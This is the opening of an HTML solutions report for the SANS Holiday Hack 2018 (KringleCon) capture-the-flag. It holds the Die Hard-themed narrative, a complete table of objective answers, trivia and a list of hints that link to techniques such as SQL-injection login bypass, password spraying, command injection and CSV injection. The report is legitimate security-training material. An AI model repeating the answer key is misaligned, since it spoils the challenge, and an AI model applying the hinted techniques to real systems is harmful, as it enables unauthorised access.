<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="Holiday Hack 2018 Report">
    <meta name="author" content="Warren Raquel">

    <title>Holiday Hack 2018 Report - Warren Raquel</title>

    <!-- Bootstrap core CSS -->
    <link href="css/bootstrap.min.css" rel="stylesheet">

    <!-- Custom styles for this template -->
    <link href="hh2018.css" rel="stylesheet">

  </head>
  <body>
    <nav class="navbar navbar-expand-lg sticky-top navbar-dark bg-dark p-0">
      <a class="navbar-brand p-2" href="#">Holiday Hack 2018</a>
      <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
      </button>
      <div class="collapse navbar-collapse" id="navbarNavDropdown">
        <ul class="navbar-nav">
          <li class="nav-item p-2">
            <a class="nav-link" href="#narrative">Narrative</a>
          </li>
          <li class="nav-item p-2">
            <a class="nav-link" href="#answers">Answers</a>
          </li>
          <li class="nav-item p-2">
            <a class="nav-link" href="#trivia">Trivia</a>
          </li>
          <li class="nav-item p-2">
            <a class="nav-link" href="#hints">Hints</a>
          </li>
          <li class="nav-item dropdown p-2">
            <a class="nav-link dropdown-toggle" href="#" id="navbarDropdownMenuLink" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
              Characters
            </a>
            <div class="dropdown-menu" aria-labelledby="navbarDropdownMenuLink">
              <a class="dropdown-item" href="#npcSanta"><img src="images/santa.png" height="30px"> Santa</a>
              <a class="dropdown-item" href="#npcHans"><img src="images/hans.png" height="30px"> Hans</a>
              <a class="dropdown-item" href="#npcBushy"><img src="images/elf-bushy-evergreen.png" height="30px"> Bushy Evergreen</a>
              <a class="dropdown-item" href="#npcMinty"><img src="images/elf-minty-candycane.png" height="30px"> Minty Candycane</a>
              <a class="dropdown-item" href="#npcTangle"><img src="images/elf-tangle-coalbox.png" height="30px"> Tangle Coalbox</a>
              <a class="dropdown-item" href="#npcWunorse"><img src="images/elf-wunorse-openslae.png" height="30px"> Wunorse Openslae</a>
              <a class="dropdown-item" href="#npcHolly"><img src="images/elf-holly-evergreen.png" height="30px"> Holly Evergreen</a>
              <a class="dropdown-item" href="#npcPepper"><img src="images/elf-pepper-minstix.png" height="30px"> Pepper Minstix</a>
              <a class="dropdown-item" href="#npcSparkle"><img src="images/elf-sparkle-redberry.png" height="30px"> Sparkle Redberry</a>
              <a class="dropdown-item" href="#npcSugar"><img src="images/elf-sugarplum-mary.png" height="30px"> SugarPlum Mary</a>
              <a class="dropdown-item" href="#npcAlabaster"><img src="images/elf-alabaster-snowball.png" height="30px"> Alabaster Snowball</a>
            </div>
          </li>
          <li class="nav-item dropdown p-2">
            <a class="nav-link dropdown-toggle" href="#" id="navbarDropdownMenuLink" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
              Objectives
            </a>
            <div class="dropdown-menu" aria-labelledby="navbarDropdownMenuLink">
              <a class="dropdown-item" href="#obj1">1</a>
              <a class="dropdown-item" href="#obj2">2</a>
              <a class="dropdown-item" href="#obj3">3</a>
              <a class="dropdown-item" href="#obj4">4</a>
              <a class="dropdown-item" href="#obj5">5</a>
              <a class="dropdown-item" href="#obj6">6</a>
              <a class="dropdown-item" href="#obj7">7</a>
              <a class="dropdown-item" href="#obj8">8</a>
              <a class="dropdown-item" href="#obj91">9.1</a>
              <a class="dropdown-item" href="#obj92">9.2</a>
              <a class="dropdown-item" href="#obj93">9.3</a>
              <a class="dropdown-item" href="#obj93">9.4</a>
              <a class="dropdown-item" href="#objx">10</a>
            </div>
          </li>
          <li class="nav-item dropdown p-2">
            <a class="nav-link dropdown-toggle" href="#" id="navbarDropdownMenuLink" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
              Terminals
            </a>
            <div class="dropdown-menu" aria-labelledby="navbarDropdownMenuLink">
              <h6 class"dropdown-header">&nbsp;Cranberry Pi</h6>
              <a class="dropdown-item" href="#termViescape">Essential Editor Skills</a>
              <a class="dropdown-item" href="#termPwshmenu">The Name Game</a>
              <a class="dropdown-item" href="#termViminfo">Lethal ForensicELFication</a>
              <a class="dropdown-item" href="#termPlaintextCreds">Stall Mucking Report</a>
              <a class="dropdown-item" href="#termHTTP2">CURLing Master</a>
              <a class="dropdown-item" href="#termSprayDetect">Yule Log Analysis</a>
              <a class="dropdown-item" href="#termGitpasshist">Dev Ops Fail</a>
              <a class="dropdown-item" href="#termPythonDockerChallenge">Python Escape from LA</a>
              <div class="dropdown-divider"></div>
              <h6 class"dropdown-header">&nbsp;Misc</h6>
              <a class="dropdown-item" href="#termVentMaze">Google Ventilation</a>
            </div>
          </li>
          <li class="nav-item dropdown p-2">
            <a class="nav-link dropdown-toggle" href="#artefacts" id="navbarDropdownMenuLink" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
              Artefacts/Materials
            </a>
            <div class="dropdown-menu" aria-labelledby="navbarDropdownMenuLink">
              <a class="dropdown-item" href="#artMenuPS1">menu.ps1 onboarding script from The Name Game</a>
              <a class="dropdown-item" href="#artWannacookie">Wannacookie Source Code</a>
              <a class="dropdown-item" href="#artWannacookieHTML">Wannacookie Source HTML Code</a>
            </div>
          </li>
        </ul>
      </div>
    </nav>

    <div class="container m-4 p-4">
      <div class="jumbotron m-4">
        <h1>SANS Holiday Hack 2018 Solutions</h1>
        <p class="lead">Report by Warren Raquel <a href="https://twitter.com/warquel" class="twitter-follow-button" data-show-count="false">Follow @warquel</a><script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script></p>
        <a href="https://www.holidayhackchallenge.com/2018/" class="btn btn-info">Holiday Hack 2018</a>
        <a href="https://kringlecon.com/" class="btn btn-info">Kringle Con 2018</a>
        <hr class="my-4">
        <p>This report will be available at <a href="https://github.com/warquel/hh2018.git">https://github.com/warquel/hh2018.git</a> once the submission deadline passes.</p>
        <hr class="my-4">
        <p>I am an Incident Response consultant at <a href="https://www.cisco.com/c/en/us/products/security/sas-incident-response.html">Cisco Security Incident Response Services Team</a>. Last year I was one of the contributors to the <a href="https://www.holidayhackchallenge.com/2017/winners/ncsa/report.html">Grand Prize winning entry for Holiday Hack 2017, Wintered</a> while a Senior Security Engineer at the <a href="http://www.ncsa.illinois.edu/">National Center for Supercomputing Applications</a>.</p>
        <p>Below is my solo entry for this year's Holiday Hack, Kringle Con. Provided are details for how to solve all the challenges, strategies for how to attack each challenge, and little bits of trivia I discovered along the way.</p>
        <p>I would like to thank SANS Counter Hack on all the hard work they put into these challenges every year. The amount of detail they put into these is impressive and certainly shows their passion for educating the community on a wide range of cyber security topics. This year's challenge was fun and challenging and I look forward to what they will come up with next year.</p>
        <p>On a personal, please visit the <a href="https://www.t1international.com/">T1International</a> site to find out more about this non-profit run <b>by</b> people with, and impacted by, type 1 diabetes <b>for</b> people with type 1 diabetes. Find out more about Type 1 diabetes and how you can help those who are unable to access insulin and diabetes supplies around the world.</p>
        <hr class="my-4">
        <p>This year's challenge appeared to be steeply rooted in the seminal classic, Die Hard. Released on July 15th, 1988 starring Bruce Willis and Alan Rickman, the story revolves around a criminal mastermind, Hans Gruber, and his taking over of the Nakatomi Plaza building over Christmas as John McClane works in the background to disrupt his plans. Hans appears to have taken over Kringle Castle and it is your job to stop him from accessing Santa's Vault! Are you up for the challenge?</p>
      </div>
    </div>

    <div class="container m-4 p-4">
      <div class="text-center border rounded m-4 p-4">
        <img align="center" width=400px src="images/kringlecon_invitation.png">
        <h1><a id="narrative"></a>Narrative</h1>
        <div class="row center">
          <div class="col-2">
            <img class="img-fluid" src="images/kc18_soldiers_pink_1.png">
            <img class="img-fluid" src="images/kc18_soldiers_blue_2.png">
            <img class="img-fluid" src="images/kc18_soldiers_red_2.png">
          </div>
          <div class="col-8">
            <p>As you walk through the gates, a familiar red-suited holiday figure warmly welcomes all of his special visitors to KringleCon.</p>
            <p>Suddenly, all elves in the castle start looking very nervous. You can overhear some of them talking with worry in their voices.</p>
            <p>The toy soldiers, who were always gruff, now seem especially determined as they lock all the exterior entrances to the building and barricade all the doors. No one can get out! And the toy soldiers' grunts take on an increasingly sinister tone.</p>
            <p>The toy soldiers act even more aggressively. They are searching for something -- something very special inside of Santa’s castle -- and they will stop at NOTHING until they find it. Hans seems to be directing their activities.</p>
            <p>In the main lobby on the bottom floor of Santa's castle, Hans calls everyone around to deliver a speech. Make sure you visit Hans to hear his speech.</p>
            <p>The toy soldiers continue behaving very rudely, grunting orders to the guests and to each other in vaguely Germanic phrases. Suddenly, one of the toy soldiers appears wearing a grey sweatshirt that has written on it in red pen, "NOW I HAVE A ZERO-DAY. HO-HO-HO."</p>
            <p>A rumor spreads among the elves that Alabaster has lost his badge. Several elves say, "What do you think someone could do with that?"</p>
            <p>Hans has started monologuing again. Please visit him in Santa's lobby for a status update.</p>
            <p>Great work! You have blocked access to Santa's treasure... for now. Please visit Hans in Santa's Secret Room for an update.</p>
            <p>And then suddenly, Hans slips and falls into a snowbank. His nefarious plan thwarted, he's now just cold and wet.</p>
            <p>But Santa still has more questions for you to solve!</p>
            <p>Congrats! You have solved the hardest challenge! Please visit Santa and Hans inside Santa's Secret Room for an update on your amazing accomplishment!</p>
          </div>
          <div class="col-2">
            <img class="img-fluid" src="images/kc18_soldiers_orange_2.png">
            <img class="img-fluid" src="images/kc18_soldiers_green_3.png">
            <img class="img-fluid" src="images/kc18_soldiers_red_3.png">
          </div>
        </div>
      </div>
    </div>

    <div class="container m-4 p-4">
      <h1><a id="answers"></a>Answers</h1>
      <table class="table">
        <thead>
          <tr>
            <th scope="col">Objective</th>
            <th scope="col">Question</th>
            <th scope="col">Answer</th>
          </td>
        </thead>
        <tbody>
          <tr>
            <th scope="row"><a href="#obj1">1</a></th>
            <td>What phrase is revealed when you answer all of the KringleCon Holiday Hack History questions?</td>
            <td class="text-nowrap" data-toggle="tooltip" title="John McClane says this to Hans Gruber after shooting him">Happy Trails</td>
          <tr>
          <tr>
            <th scope="row"><a href="#obj2">2</a></th>
            <td>Who submitted (First Last) the rejected talk titled Data Loss for Rainbow Teams: A Path in the Darkness? Please analyze the CFP site to find out.</td>
            <td class="text-nowrap">John McClane</td>
          <tr>
          <tr>
            <th scope="row"><a href="#obj3">3</a></th>
            <td>The KringleCon Speaker Unpreparedness room is a place for frantic speakers to furiously complete their presentations. The room is protected by a door passcode. Upon entering the correct passcode, what message is presented to the speaker?</td>
            <td class="text-nowrap">Welcome unprepared speaker!</td>
          <tr>
          <tr>
            <th scope="row"><a href="#obj4">4</a></th>
            <td>Retrieve the encrypted ZIP file from the <a href="#obj94">North Pole Git repository</a>. What is the password to open this file?</td>
            <td class="text-nowrap" data-toggle="tooltip" title="John McClane's catch phrase from Die Hard">Yippee-ki-yay</td>
          <tr>
          <tr>
            <th scope="row"><a href="#obj5">5</a></th>
            <td>Using the data set contained in this SANS Slingshot Linux image, find a reliable path from a Kerberoastable user to the Domain Admins group. What’s the user’s logon name (in username@domain.tld format)? Remember to avoid RDP as a control path as it depends on separate local privilege escalation flaws.</td>
            <td class="text-nowrap">LDUBEJ00320@AD.KRINGLECASTLE.COM</td>
          <tr>
          <tr>
            <th scope="row"><a href="#obj6">6</a></th>
            <td>Bypass the authentication mechanism associated with the room near Pepper Minstix. <a href="#artBadge">A sample employee badge is available</a>. What is the access control number revealed by the door authentication panel?</td>
            <td class="text-nowrap" data-toggle="tooltip" title="Release date of Die Hard">19880715</td>
          <tr>
          <tr>
            <th scope="row"><a href="#obj7">7</a></th>
            <td>Santa uses an Elf Resources website to look for talented information security professionals. <a href="https://careers.kringlecastle.com/">Gain access to the website</a> and fetch the document <code>C:\candidate_evaluation.docx</code>. Which terrorist organization is secretly supported by the job applicant whose name begins with "<span data-toggle="tooltip" title="Krampus">K</span>"?</td>
            <td class="text-nowrap" data-toggle="tooltip" title="Akin to Fancy Bear, a suspected Russian state backed espionage group">Fancy Beaver</td>
          <tr>
          <tr>
            <th scope="row"><a href="#obj8">8</a></th>
            <td>Santa has introduced a <a href="https://packalyzer.kringlecastle.com/">web-based packet capture and analysis tool</a> to support the elves and their information security work. Using the system, access and decrypt HTTP/2 network activity. What is the name of the song described in the document sent from Holly Evergreen to Alabaster Snowball?</td>
            <td class="text-nowrap">mary had a little lamb</td>
          <tr>
          <tr>
            <th scope="row"><a href="#obj91">9.1</a></th>
            <td>
              <p>Alabaster Snowball is in dire need of your help. Santa's file server has been hit with malware. Help Alabaster Snowball deal with the malware on Santa's server by completing several tasks</p>
              <p>To start, assist Alabaster by accessing (clicking) the snort terminal below:</p>
              <p><a href="#obj91"><img src="images/snort.png"></a></p>
              <p>Then create a rule that will catch all new infections. What is the success message displayed by the Snort terminal?</p>
            </td>
            <td>Congratulation! Snort is alerting on all ransomware and only the ransomware!</td>
          <tr>
          <tr>
            <th scope="row"><a href="#obj92">9.2</a></th>
            <td>After completing the prior question, Alabaster gives you a document he suspects downloads the malware. What is the domain name the malware in the document downloads from?</td>
            <td class="text-nowrap" data-toggle="tooltip" title="ROT13 and reversed HANSGRUBER">erohetfanu.com</td>
          <tr>
          <tr>
            <th scope="row"><a href="#obj93">9.3</a></th>
            <td>
              Analyze the full malware source code to find a kill-switch and activate it at the North Pole's domain registrar <a href="#obj93">HoHoHo Daddy</a>.<br/>
              <br/>
              What is the full sentence text that appears on the domain registration success message (bottom sentence)?
            </td>
            <td class="text-nowrap">Successfully registered yippeekiyaa.aaay!</td>
          <tr>
          <tr>
            <th scope="row"><a href="#obj94">9.4</a></th>
            <td>After activating the kill-switch domain in the last question, Alabaster gives you <a href="#obj94">a zip file</a> with a memory dump and encrypted password database. Use these files to decrypt Alabaster's password database. What is the password entered in the database for the <b>Vault</b> entry?</td>
            <td class="text-nowrap" data-toggle="tooltip" title="From the Overture of The Marriage of Figaro and the piano unlock key for Willy Wonka's Chocolate Factory">ED#ED#EED#EF#G#F#G#ABA#BA#B</td>
          <tr>
          <tr>
            <th scope="row"><a href="#objx">10</a></th>
            <td>Use what you have learned from previous challenges to open the <a href="#objx">door to Santa's vault</a>. What message do you get when you unlock the door?</td>
            <td class="text-nowrap">You have unlocked Santa's vault!</td>
          <tr>
        </tbody>
      </table>
    </div>

    <div class="container m-4 p-4">
      <h1><a id="trivia"></a>Trivia</h1>
      <p class="lead">Below are some of the miscellanous trivia stumbled upon during the challenge.</p>
      <table class="table">
        <thead>
          <tr>
            <th scope="col">Artefact</th>
            <th scope="col">Signficance</th>
          </td>
        </thead>
        <tbody>
          <tr>
            <td>"Python Escape from LA"</td>
            <td>This is a reference to the 1996 movie <a href="https://www.imdb.com/title/tt0116225/">"Escape from L.A."</a> starring the legendary Kurt Russel (who, BTW, recently starred as Santa on Netflix's Christmas Chronicles) as the main protagonist, <b>Snake Plissken</b>. On a personal note <a href="https://twitter.com/PostMortemMG/status/1070766697026543616/photo/1">this would be a kick-ass cross-over for next year.</a></td>
          </tr>
          <tr>
            <td>WannaCookie Author "Bill Clay"</td>
            <td>In the source html, <a href="#artWannacookieHTML">source.html</a>, the author is cited as "Bill Clay". This is in reference to Hans Gruber in Die Hard. When John McClane happens upon Alan Rickman's character alone and unarmed, Alan uses a bad American accent to say his name is <a href="https://www.youtube.com/watch?v=c7SoiiZtRa0">"Clay... Bill Clay"</a>. Rumor is that this scene was quickly added after producers heard Alan's "American accent".</td>
          </tr>
          <tr>
            <td>Tommy Tutone!</td>
            <td>In the Wannacookie ransome html, it asks for 8675309 bitcoin. <a href="https://www.youtube.com/watch?v=6WTdTwcmxyo">867-5309 was Jenny's number.</a></td>
          <tr>
            <td>erohetfanu</td>
            <td>If you <code>echo erohetfanu | rev | tr 'A-Za-z' 'N-ZA-Mn-za-m'</code> the result is <code>hansgruber</code>. As a matter of fact, all domains in the provided pcaps in the snort challange are anagrams of hansgruber with different tlds of .net, .com, and .org.</td>
          </tr>
          <tr>
            <td><a id="trivPianoLock"></a>Piano Lock</td>
            <td>The piano lock is taken straight from the 1971 classic, <a href="https://www.imdb.com/title/tt0067992/">Willy Wonka & the Chocolate Factory</a>. <a href="https://www.youtube.com/watch?v=5g4r-FbGivk">Mr. Wonka plays a few notes on a small piano keyboard which in turn, opens a giant door into his factory.</a> Mrs. Teevee casually recognizes the tune as "Rachmaninoff", however, this is incorrect. The tune is actually from the Mozart's overture to "The Marriage of Figaro". Alabaster is also incorrect in assuming it's Rachmaninoff.</td>
          </tr>
          <tr>
            <td>19880715</td>
            <td>This is the release date, July 15, 1988, of Die Hard starring Bruce Willis and Alan Rickman</td>
          </tr>
          <tr>
            <td>Fancy Beaver</td>
            <td>This alludes to Fancy Bear, a cyber espionage group purportedly backed by the Russian government.</td>
          </tr>
          <tr>
            <td>Yippee-ki-yay</td>
            <td>This is John McClane's (main protagonist of the movie Die Hard) catch phrase</td>
          </tr>
          <tr>
            <td>Happy Trails</td>
            <td>This is said to Hans after John McClane shoots him in the final scenes of Die Hard</td>
          </tr>
          <tr>
            <td>Google Vent Maze</td>
            <td>This is a direct reference to John McClane moving around the air ducts of Nakatomi Plaza in the movie Die Hard</td>
          </tr>
        </tbody>
      </table>
    </div>

    <div class="container m-4 p-4">
      <h1><a id="hints"></a>Hints</h1>
      <p class="lead">There were actually multiple hints throughout the game, but the ones below were those provided on the <b>hints</b> section of your in-game badge.</p>
      <table class="table">
        <thead>
          <tr>
            <th scope="col">Source</th>
            <th scope="col">Hint</th>
            <th scope="col">Application</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td>
              <div class="dropdown">
                <button class="btn btn-dark dropdown-toggle" type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                  <a id="hntBushy"></a>Bushy Evergreen
                </button>
                <div class="dropdown-menu" aria-labelledby="dropdownMenuButton">
                  <a class="dropdown-item" href="#npcBushy">Bushy Evergreen</a>
                  <a class="dropdown-item" href="#obj1">Objective 1</a>
                  <a class="dropdown-item" href="#termViescape">Essential Editor Skills</a>
                </div>
              </div>
            </td>
            <td>Vi Editor Basics: <a href="https://kb.iu.edu/d/afcz">Indiana University Vi Tutorials</a></td>
            <td><a href="#termViescape">Essential Editor Skills</a></td>
          </tr>
          <tr>
            <td>
              <div class="dropdown">
                <button class="btn btn-dark dropdown-toggle" type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                  <a id="hntMinty"></a>Minty Candycane
                </button>
                <div class="dropdown-menu" aria-labelledby="dropdownMenuButton">
                  <a class="dropdown-item" href="#npcMinty">Minty Candycane</a>
                  <a class="dropdown-item" href="#obj2">Objective 2</a>
                  <a class="dropdown-item" href="#termPwshmenu">The Name Game</a>
                </div>
              </div>
            </td>
            <td>SQLite3 .dump'ing: <a href="https://www.digitalocean.com/community/questions/how-do-i-dump-an-sqlite-database">SQLite3 Data Dump</a></td>
            <td><a href="#termPwshmenu">The Name Game</a></td>
          </tr>
          <tr>
            <td><a href="#npcMinty">Minty Candycane</a></td>
            <td>PowerShell Command Injection: <a href="https://ss64.com/ps/call.html">PowerShell Call/& Operator</a></td>
            <td><a href="#termPwshmenu">The Name Game</a></td>
          </tr>
          <tr>
            <td><a href="#npcMinty">Minty Candycane</a></td>
            <td><a href="https://portswigger.net/kb/issues/00600100_directory-listing">Website Directory Browsing</a></td>
            <td><a href="#obj2">Objective 2</a></td>
          </tr>
          <tr>
            <td><a href="#npcMinty">Minty Candycane</a></td>
            <td>Finding Browsable Directories: <i>On a website, finding browsable directories is sometimes as simple as removing characters from the end of a URL.</i></td>
            <td><a href="#obj2">Objective 2</a></td>
          </tr>
          <tr>
            <td>
              <div class="dropdown">
                <button class="btn btn-dark dropdown-toggle" type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                  <a id="hntTangle"></a>Tangle Coalbox
                </button>
                <div class="dropdown-menu" aria-labelledby="dropdownMenuButton">
                  <a class="dropdown-item" href="#npcTangle">Tangle Coalbox</a>
                  <a class="dropdown-item" href="#obj3">Objective 3</a>
                  <a class="dropdown-item" href="#termViminfo">Lethal ForensicELFication</a>
                </div>
              </div>
            </td>
            <td>Vim Artifacts: <a href="https://tm4n6.com/2017/11/15/forensic-relevance-of-vim-artifacts/">Forensic Relevance of Vim Artifacts</a></td>
            <td><a href="#termViminfo">Lethal ForensicELFication</a></td>
          </tr>
          <tr>
            <td><a href="#npcTangle">Tangle Coalbox</a></td>
            <td><a href="https://hackaday.com/2018/06/18/opening-a-ford-with-a-robot-and-the-de-bruijn-sequence/">Opening a Ford with a Robot and the de Bruijn Sequence</a></td>
            <td><a href="#obj3">Objective 3</a></td>
          </tr>
          <tr>
            <td><a href="#npcTangle">Tangle Coalbox</a></td>
            <td><a href="http://www.hakank.org/comb/debruijn.cgi">de Bruijn Sequence Generator</a></td>
            <td><a href="#obj3">Objective 3</a></td>
          </tr>
          <tr>
            <td>
              <div class="dropdown">
                <button class="btn btn-dark dropdown-toggle" type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                  <a id="hntWunorse"></a>Wunorse Openslae
                </button>
                <div class="dropdown-menu" aria-labelledby="dropdownMenuButton">
                  <a class="dropdown-item" href="#npcWunorse">Wunorse Openslae</a>
                  <a class="dropdown-item" href="#obj4">Objective 4</a>
                  <a class="dropdown-item" href="#termPlaintextCreds">Stall Mucking Report</a>
                </div>
              </div>
            </td>
            <td>Plaintext Credentials in Commands: <a href="https://blog.rackspace.com/passwords-on-the-command-line-visible-to-ps">Keeping Command Line Passwords Out of PS</a></td>
            <td><a href="#termPlaintextCreds">Stall Mucking Report</a></td>
          </tr>
          <tr>
            <td><a href="#npcWunorse">Wunorse Openslae</a></td>
            <td><a href="https://youtu.be/myKrWVaq3Cw?t=185">Brian Hostetler is giving a great Trufflehog talk upstairs</a></td>
            <td><a href="#obj4">Objective 4</a></td>
          </tr>
          <tr>
            <td><a href="#npcWunorse">Wunorse Openslae</a></td>
            <td><a href="https://github.com/dxa4481/truffleHog">Trufflehog Tool</a></td>
            <td><a href="#obj4">Objective 4</a></td>
          </tr>
          <tr>
            <td>
              <div class="dropdown">
                <button class="btn btn-dark dropdown-toggle" type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                  <a id="hntHolly"></a>Holly Evergreen
                </button>
                <div class="dropdown-menu" aria-labelledby="dropdownMenuButton">
                  <a class="dropdown-item" href="#npcHolly">Holly Evergreen</a>
                  <a class="dropdown-item" href="#obj5">Objective 5</a>
                  <a class="dropdown-item" href="#termHTTP2">CURLing Master</a>
                </div>
              </div>
            </td>
            <td><a href="https://developers.google.com/web/fundamentals/performance/http2/">HTTP/2.0 Basics</a></td>
            <td><a href="#termHTTP2">CURLing Master</a></td>
          </tr>
          <tr>
            <td><a href="#npcHolly">Holly Evergreen</a></td>
            <td><a href="https://github.com/BloodHoundAD/BloodHound">Bloodhound Tool</a></td>
            <td><a href="#obj5">Objective 5</a></td>
          </tr>
          <tr>
            <td><a href="#npcHolly">Holly Evergreen</a></td>
            <td><a href="https://youtu.be/gOpsLiJFI1o">Bloodhound Demo</a></td>
            <td><a href="#obj5">Objective 5</a></td>
          </tr>
          <tr>
            <td>
              <div class="dropdown">
                <button class="btn btn-dark dropdown-toggle" type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                  <a id="hntPepper"></a>Pepper Minstix
                </button>
                <div class="dropdown-menu" aria-labelledby="dropdownMenuButton">
                  <a class="dropdown-item" href="#npcPepper">Pepper Minstix</a>
                  <a class="dropdown-item" href="#obj6">Objective 6</a>
                  <a class="dropdown-item" href="#termSprayDetect">Yule Log Analysis</a>
                  <a class="dropdown-item" href="#obj6">Scan-O-Matic</a>
                </div>
              </div>
            </td>
            <td>Password Spraying: <a href="https://securityweekly.com/2017/07/21/tsw11/">Password Spraying with MailSniper.ps1</a></td>
            <td><a href="#termSprayDetect">Yule Log Analysis</a></td>
          </tr>
          <tr>
            <td><a href="#npcPepper">Pepper Minstix</a></td>
            <td><a href="https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF#Auth_Bypass">SQL Injection</a></td>
            <td><a href="#obj6">Objective 6</a></td>
          </tr>
          <tr>
            <td><a href="#npcPepper">Pepper Minstix</a></td>
            <td>Barcode Creation: <a href="https://www.the-qrcode-generator.com/">Creating QR Codes</a></td>
            <td><a href="#obj6">Objective 6</a></td>
          </tr>
          <tr>
            <td>
              <div class="dropdown">
                <button class="btn btn-dark dropdown-toggle" type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                  <a id="hntSparkle"></a>Sparkle Redberry
                </button>
                <div class="dropdown-menu" aria-labelledby="dropdownMenuButton">
                  <a class="dropdown-item" href="#npcSparkle">Sparkle Redberry</a>
                  <a class="dropdown-item" href="#obj7">Objective 7</a>
                  <a class="dropdown-item" href="#termGitpasshist">Dev Ops Fail</a>
                </div>
              </div>
            </td>
            <td><a href="https://gist.github.com/hofmannsven/6814451">Git Cheat Sheet</a></td>
            <td><a href="#termGitpasshist">Dev Ops Fail</a></td>
          </tr>
          <tr>
            <td><a href="#npcSparkle">Sparkle Redberry</a></td>
            <td>Finding Passwords in Git: <a href="https://en.internetwache.org/dont-publicly-expose-git-or-how-we-downloaded-your-websites-sourcecode-an-analysis-of-alexas-1m-28-07-2015/">Search Git for Passwords</a></td>
            <td><a href="#termGitpasshist">Dev Ops Fail</a></td>
          </tr>
          <tr>
            <td><a href="#npcSparkle">Sparkle Redberry</a></td>
            <td><a href="https://www.owasp.org/index.php/CSV_Injection">OWASP CSV Injection Page</a></td>
            <td><a href="#obj7">Objective 7</a></td>
          </tr>
          <tr>
            <td><a href="#npcSparkle">Sparkle Redberry</a></td>
            <td>CSV Injection Talk: <a href="https://www.youtube.com/watch?v=Z3qpcKVv2Bg">Somehow Brian Hostetler is giving a talk on CSV injection WHILE he's giving a talk on Trufflehog. Whatta' guy!</a></td>
            <td><a href="#obj7">Objective 7</a></td>
          </tr>
          <tr>
            <td>
              <div class="dropdown">
                <button class="btn btn-dark dropdown-toggle" type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                  <a id="hntSugar"></a>SugarPlum Mary
                </button>
                <div class="dropdown-menu" aria-labelledby="dropdownMenuButton">
                  <a class="dropdown-item" href="#npcSugar">SugarPlum Mary</a>
                  <a class="dropdown-item" href="#obj8">Objective 8</a>
                  <a class="dropdown-item" href="#termPythonDockerChallenge">Python Escape from LA</a>
                </div>
              </div>
            </td>
            <td>Python Escape: <a href="https://www.youtube.com/watch?v=ZVx2Sxl3B9c">Check out Mark Baggett's talk upstairs</a></td>
            <td><a href="#termPythonDockerChallenge">Python Escape from LA</a></td>
          </tr>
          <tr>
            <td><a href="#npcSugar">SugarPlum Mary</a></td>
            <td>HTTP/2.0 Intro and Decryption: <a href="https://www.youtube.com/watch?v=9E-8HkDs-kQ">Did you see Chris' & Chris' talk on HTTP/2.0?</a></td>
            <td><a href="#obj8">Objective 8</a></td>
          </tr>
          <tr>
            <td>
              <div class="dropdown">
                <button class="btn btn-dark dropdown-toggle" type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                  <a id="hntShinny"></a>Shinny Upatree
                </button>
                <div class="dropdown-menu" aria-labelledby="dropdownMenuButton">
                  <a class="dropdown-item" href="#npcShinny">Shinny Upatree</a>
                  <a class="dropdown-item" href="#obj91">Objective 9.1</a>
                  <a class="dropdown-item" href="#termUnlinkedFunction">Sleigh Bell Lottery</a>
                </div>
              </div>
            </td>
            <td><a href="https://pen-testing.sans.org/blog/2018/12/11/using-gdb-to-call-random-functions">Using gdb to Call Random Functions!</a></td>
            <td><a href="#termUnlinkedFunction">Sleigh Bell Lottery</a></td>
          </tr>
          <tr>
            <td>
              <div class="dropdown">
                <button class="btn btn-dark dropdown-toggle" type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                <a id="hntAlabaster"></a>Alabaster Snowball
                </button>
                <div class="dropdown-menu" aria-labelledby="dropdownMenuButton">
                  <a class="dropdown-item" href="#npcAlabaster">Alabaster Snowball</a>
                  <a class="dropdown-item" href="#obj92">Objective 9.2</a>
                  <a class="dropdown-item" href="#obj93">Objective 9.3</a>
                  <a class="dropdown-item" href="#obj94">Objective 9.4</a>
                  <a class="dropdown-item" href="#obj10">Objective 10</a>
                  <a class="dropdown-item" href="#obj91">Snort Challenge</a>
                  <a class="dropdown-item" href="#obj93">HoHoHo Daddy</a>
                  <a class="dropdown-item" href="#objx">Piano Lock</a>
                </div>
              </div>
            </td>
            <td>Dropper Download: Word docm macros can be extracted using <a href="https://github.com/decalage2/oletools/wiki/olevba">olevba</a>. Perhaps we can use this to grab the ransomware source.</td>
            <td><a href="#obj92">Objective 9.2</a></td>
          </tr>
          <tr>
            <td><a href="#npcAlabaster">Alabaster Snowball</a></td>
            <td>Malware Reverse Engineering: <a href="https://www.youtube.com/watch?v=wd12XRq2DNk">Whoa, Chris Davis' talk on PowerShell malware is crazy pants! You should check it out!</a></td>
            <td><a href="#obj93">Objective 9.3</a></td>
          </tr>
        </tbody>
      </table>
    </div>

    <div class="container m-4 p-4">
      <h1><a id="obj"></a>Objectives</h1>
      <p class="lead">The following section walks through the different challenges of this years Holiday Hack.</p>
      <div class="border p-2 m-2">
        <div class="dropdown">
          <button class="btn btn-dark dropdown-toggle" type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
            <a id="obj1"></a>Objective 1
          </button>
          <div class="dropdown-menu" aria-labelledby="dropdownMenuButton">
